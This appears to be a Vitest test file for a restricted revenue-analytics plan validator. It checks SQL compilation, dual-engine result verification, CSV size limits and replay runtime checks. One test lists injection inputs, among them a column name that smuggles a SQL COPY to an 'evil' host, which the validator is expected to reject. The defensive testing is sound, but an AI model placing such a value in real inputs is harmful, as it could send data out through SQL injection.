import { describe, expect, test } from "vitest";
import { validatePlan, compileSQL, verification } from "../src/contracts";
const valid = {
  version: 1,
  kind: "revenue_sum",
  datasetHash: "a".repeat(64),
  amountColumn: "revenue",
  dateColumn: "completed_at",
  start: "2025-07-01T00:00:00Z",
  end: "2025-10-01T00:00:00Z",
  timezone: "UTC",
  currency: "USD",
  nullPolicy: "exclude",
};
describe("restricted plans", () => {
  test("accepts only typed known operations", () =>
    expect(validatePlan(valid)).toEqual(valid));
  test.each([
    { ...valid, code: "print(secret)" },
    { ...valid, kind: "exec" },
    { ...valid, amountColumn: "revenue);COPY x TO https://evil" },
  ])("rejects capability injection", (p) =>
    expect(() => validatePlan(p)).toThrow(),
  );
  test("requires half-open UTC period", () =>
    expect(() => validatePlan({ ...valid, end: valid.start })).toThrow());
  test("compiles fixed decimal analytics without free-form source", () => {
    const sql = compileSQL(validatePlan(valid));
    expect(sql).toContain("DECIMAL(18,2)");
    expect(sql).toContain('"revenue"');
    expect(sql).not.toContain("COPY");
  });
});
test("preserves contradiction instead of choosing the convenient answer", () => {
  expect(
    verification(
      { minorUnits: "1800", count: 3 },
      { minorUnits: "2000", count: 3 },
    ),
  ).toEqual({ state: "DISPUTED", provenance: "CLIENT_REPORTED" });
  expect(
    verification(
      { minorUnits: "3033", count: 3 },
      { minorUnits: "3033", count: 3 },
    ).state,
  ).toBe("VERIFIED");
  expect(
    verification({ minorUnits: null, count: 0 }, { minorUnits: null, count: 0 })
      .state,
  ).toBe("INCONCLUSIVE");
});

test.each([["error"], ["exclude"], {}, null])(
  "rejects coerced null policy %j",
  (nullPolicy) => {
    expect(() => validatePlan({ ...valid, nullPolicy })).toThrow();
  },
);
test.each([
  {},
  { minorUnits: undefined, count: 0 },
  { minorUnits: "nan", count: 1 },
  { minorUnits: "1", count: -1 },
  { minorUnits: "01", count: 1 },
])("malformed evidence never verifies %j", (value) => {
  expect(() => verification(value as never, value as never)).toThrow(
    "INVALID_RESULT",
  );
});

test("ingestion rejects expanded tiny-field tables before either engine starts", async () => {
  const { preflightCSV } = await import("../src/contracts");
  expect(() =>
    preflightCSV(new TextEncoder().encode(",".repeat(800000))),
  ).toThrow("EXPANDED_INPUT_LIMIT");
  expect(() => preflightCSV(new Uint8Array([0xff]))).toThrow();
});
test("replay refuses an otherwise equal result under a changed runtime", async () => {
  const { replayMatches } = await import("../src/contracts");
  const base = {
    datasetHash: valid.datasetHash,
    sql: { minorUnits: "1", count: 1 },
    python: { minorUnits: "1", count: 1 },
    runtime: {
      duckdb: "v1.4.3",
      pyodide: "0.29.3",
      pandas: "2.3.3",
      numpy: "2.2.5",
    },
  } as never;
  expect(() =>
    replayMatches(base, {
      ...(base as object),
      runtime: { duckdb: "v9.0.0" },
    } as never),
  ).toThrow("REPLAY_RUNTIME_OR_SNAPSHOT_MISMATCH");
});

test("resource measurements are finite bounds, separate from memory estimates", async () => {
  const { validateExecutionResult, PYTHON_SOURCE } = await import(
    "../src/contracts"
  );
  const p = validatePlan(valid);
  const result = {
    datasetHash: p.datasetHash,
    sql: { minorUnits: "3033", count: 3 },
    python: { minorUnits: "3033", count: 3 },
    schema: ["revenue", "completed_at"],
    rows: 5,
    runtime: {
      duckdb: "v1.4.3",
      pyodide: "0.29.3",
      pandas: "2.3.3",
      numpy: "2.2.5",
    },
    sqlSource: compileSQL(p),
    pythonSource: PYTHON_SOURCE,
    elapsedMs: 100,
    memory: { pandasDataframeBytes: 1200, duckdbTrackedBytes: 6000000 },
  };
  expect(validateExecutionResult(result, p)).toEqual(result);
  expect(() =>
    validateExecutionResult(
      {
        ...result,
        memory: { pandasDataframeBytes: Infinity, duckdbTrackedBytes: 1 },
      },
      p,
    ),
  ).toThrow();
});

test("validated desktop support rejects more than 100000 data rows", async () => {
  const { preflightCSV } = await import("../src/contracts");
  const row = "2025-07-01T00:00:00Z,10.10\n";
  expect(() =>
    preflightCSV(
      new TextEncoder().encode("completed_at,revenue\n" + row.repeat(100000)),
    ),
  ).not.toThrow();
  expect(() =>
    preflightCSV(
      new TextEncoder().encode("completed_at,revenue\n" + row.repeat(100001)),
    ),
  ).toThrow("EXPANDED_INPUT_LIMIT");
});
